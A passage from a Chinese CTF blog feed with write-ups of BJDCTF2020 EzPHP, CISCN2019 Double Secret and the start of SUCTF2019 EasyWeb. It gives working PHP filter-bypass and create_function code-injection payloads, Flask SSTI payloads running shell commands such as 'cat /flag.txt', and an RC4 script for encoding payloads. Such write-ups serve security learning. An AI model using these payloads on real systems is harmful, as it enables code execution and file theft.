class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure><p><img src="/post/2021-12/[BJDCTF2020]EzPHP/202112132119146.png" alt="image-20211213191114867"></p><p>通过上面例子我们发现<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>并不会把我们的内容进行转义，从而我们可以利用这一特征绕过所有的黑名单</p><p>全编码找不到，就自己写了个小脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="built_in">input</span>()</span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;=&#x27;</span> <span class="keyword">or</span> i == <span class="string">&#x27;&amp;&#x27;</span>:</span><br><span class="line">        url += i</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    url += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(url)</span><br></pre></td></tr></table></figure><h2 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br></pre></td></tr></table></figure><p>第一个<code>if</code>只要不用<code>http和https</code>就好了，重点是第二个<code>if</code>，这里我们使用换行符<code>%0a</code>进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debu=aqua_is_cute%0a</span><br></pre></td></tr></table></figure><h2 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>使用了<code>$_REQUEST</code>魔术变量，它默认情况下包含了<code>$_GET，$_POST和$_COOKIE</code>的数组。</p><blockquote><p><strong>注意</strong>:</p><p>由于 $_REQUEST 中的变量通过 GET，POST 和 COOKIE 输入机制传递给脚本文件，因此可以被远程用户篡改而并不可信。这个数组的项目及其顺序依赖于 PHP 的 <a href="https://www.php.net/manual/zh/ini.core.php#ini.request-order">request_order</a> 和 <a href="https://www.php.net/manual/zh/ini.core.php#ini.variables-order">variables_order</a> 指令的配置。</p></blockquote><p><code>request_order</code>中是这样说的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该指令描述了 PHP 将 GET、POST 和 Cookie 变量注册到 _REQUEST 数组中的顺序。注册是从左到右完成的，新值覆盖旧值。</span><br></pre></td></tr></table></figure><p>所以说如果你传入了同名的<code>$_POST</code>变量，将会覆盖掉<code>$_GET</code>，从这里出发，我们就可以轻松绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:debu=aqua_is_cute%0a</span><br><span class="line">POST:debu=1</span><br></pre></td></tr></table></figure><h2 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里的<code>$file</code>是在<code>Level2</code>中通过<code>GET</code>传参进入的，这里我们用到了<code>data流协议</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:file=data://text/plain,debu_debu_aqua</span><br><span class="line">POST:file=2</span><br></pre></td></tr></table></figure><h2 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>sha1</code>绕过，和<code>md5</code>绕过方式相同，使用数组绕过即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET:shana[]=1&amp;passwd[]=2</span><br></pre></td></tr></table></figure><p>因为本身传入的值就是数字，所以不需要再<code>POST</code></p><h2 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是这个题的重难点，也是看了一些大佬的WP才给做出来，这里用到了像<code>sql注入</code>一样的思想进行了代码注入。such as：</p><p>这里<code>code</code>和<code>arg</code>变量都是可控的（通过<code>Level5的extract函数</code>），遇到这种情况我们首先需要想到<a href="https://www.php.net/manual/en/ref.funchand.php">Function handling Functions</a>j即<code>函数处理函数</code>，经过查找，发现符合<code>参数要求</code>的只有<code>create_function</code></p><blockquote><p>create_function(string <code>$args</code>, string <code>$code</code>): string</p><p>根据传递的参数创建一个匿名函数，并为其返回一个唯一的名称。</p><p>args：函数参数</p><p>code：功能代码</p></blockquote><p>demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;echo $a;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = create_function(<span class="string">&#x27;$a&#x27;</span>, <span class="variable">$code</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">输出==&gt;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>通过实例我们大概构思一下这个函数如何生成的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params">args</span>)</span>&#123;</span><br><span class="line">    code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上述结构我们尝试注入恶意代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function b(args)&#123;</span><br><span class="line">    &#125;eval($_GET[&#x27;cmd&#x27;]);//</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">即code=&#125;eval($_GET[&#x27;cmd&#x27;]);//</span><br></pre></td></tr></table></figure><p>这里正则过滤了很多输出语句，这里使用<code>var_dump(get_defined_vars())</code>输出常量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag[code]=create_function&amp;flag[arg]=&#125;var_dump(get_defined_vars());//</span><br></pre></td></tr></table></figure><p>PS：以上所有payload请自行编码哦！</p><blockquote><p>GET:</p><p>%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61%5b%5d=%31&amp;%70%61%73%73%77%64%5b%5d=%32&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f</p><p>POST:</p><p>debu=1&amp;file=2</p></blockquote><p>在最后得到:</p><blockquote><p>I hid the real flag in rea1fl4g.php</p></blockquote><p>然后我们使用伪协议进行读取</p><blockquote><p>require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)</p></blockquote><p>但是我们还要绕过正则，这里我们可以使用<code>异或</code>来绕过，运算符在被包含时的时候会正常执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=rea1fl4g.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">输出==&gt;%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%C5%D0%D0%<span class="number">99</span>%<span class="number">96</span>%<span class="number">93</span>%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">8</span>D%D0%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%C2%<span class="number">9</span>C%<span class="number">90</span>%<span class="number">91</span>%<span class="number">89</span>%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B%D1%<span class="number">9</span>D%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">9</span>A%C9%CB%D2%<span class="number">9</span>A%<span class="number">91</span>%<span class="number">9</span>C%<span class="number">90</span>%<span class="number">9</span>B%<span class="number">9</span>A%D0%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">90</span>%<span class="number">8</span>A%<span class="number">8</span>D%<span class="number">9</span>C%<span class="number">9</span>A%C2%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">9</span>E%CE%<span class="number">99</span>%<span class="number">93</span>%CB%<span class="number">98</span>%D1%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F</span><br></pre></td></tr></table></figure><blockquote><p>GET:</p><p>%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61%5b%5d=%31&amp;%70%61%73%73%77%64%5b%5d=%32&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//</p><p>POST:debu=1&amp;file=2</p></blockquote><p>将得到的内容base64解密即可获得flag</p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> bypass </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019华东南赛区 Double Secret</title>
      <link href="/post/2021-12/%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DDouble%20Secret/"/>
      <url>/post/2021-12/%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DDouble%20Secret/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h1><p><strong>考点：1、RC4加密    2、FlaskのSSTI</strong></p><p>进去一脸懵逼，常规流程走一套啥也没发现</p><p>然后先是看到了毫无用处的<code>robots.txt</code>，<code>dirsearch</code>扫了一遍也没扫到，在后面尝试了<code>index.php、index.jsp、index.html</code>，以自己的知识量猜测就是<code>python的flask</code>，然后就盲猜了一手<code>/secret</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tell me your secret.I will encrypt it so others can&#x27;t see</span><br></pre></td></tr></table></figure><p>猜测注入点是<code>secret</code>，注入后发现不明的回显，瞎输了一些东西后发现报错</p><p>![image-20211212194358309]([CISCN2019 华东南赛区]Double Secret/202112121955519.png)</p><p>关键代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">    rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line"> </span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">Open an interactive python shell <span class="keyword">in</span> this frame </span><br></pre></td></tr></table></figure><p>将输入的内容进行了rc4解密并回显到了页面上，所以我们只需要将<code>payload</code>进行rc4加密后注入即可</p><p>加密地址：<a href="http://www.hiencode.com/rc4.html">http://www.hiencode.com/rc4.html</a></p><p>显示尝试<code>&#123;&#123;7*7&#125;&#125;</code>，回显<code>49</code>，证明存在<code>SSTI</code></p><p>接着先随便使用一个<code>payload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p> 关于<code>FlaskのSSTI</code>，可以看看之前的文章<a href="https://seizer.top/post/2021-10/Flask%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">Flask框架及其漏洞学习</a></p><blockquote><p>payload:</p><p>secret=LhQZVqUJDWds0+csvb73uyesa3qIbel8A4UHthzzDeAhhE/XBOIX20CdgvEqM/MKqq1DYiqsJn/QdgbWvEsVvd1Zp1Q=</p></blockquote><p>发现成功执行没有任何过滤，然后依次是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read() &#125;&#125;</span><br><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat /flag.txt&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>加密后注入即可获得flag</p><p>做rc4加密的时候先是自己在网上找脚本，发现好多都用不了，最后只能找到一个大师傅的wp脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><span class="comment">#返回加密后得内容</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)) </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsTreasure&quot;</span>  <span class="comment">#此处为密文</span></span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&quot;请输入明文:\n&quot;</span>)</span><br><span class="line">enc_base64 = rc4_main( key , message )</span><br><span class="line">enc_init = <span class="built_in">str</span>(base64.b64decode(enc_base64),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)</span><br><span class="line"><span class="comment">#print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> Flask </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2019 EasyWeb</title>
      <link href="/post/2021-12/%5BSUCTF%202019%5DEasyWeb/"/>
      <url>/post/2021-12/%5BSUCTF%202019%5DEasyWeb/</url>
      
        <content type="html"><![CDATA[<h1 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h1><p><strong>考点：1、文件上传 bypass    2、.htaccess的利用</strong></p><p>开局源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = substr(<span class="variable">$name</span>, strrpos(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        print_r(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = count_chars(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第三行有个提示：</p><blockquote><p>webadmin will remove your upload file every 20 min!!!! </p><p>我的垃圾翻译：你的上传文件每20分钟将会被管理员删除</p></blockquote><p>接着我们去分析源码，一共需要绕过3层判断，分辨是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">strlen(<span class="variable">$hhh</span>)&gt;<span class="number">18</span></span><br><span class="line"><span class="comment">// 传入的值长度不能大于18</span></span><br><span class="line">preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>)</span><br><span class="line">    <span class="comment">// 正则匹配</span></span><br><span class="line">strlen(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>)</span><br><span class="line">    <span class="comment">// 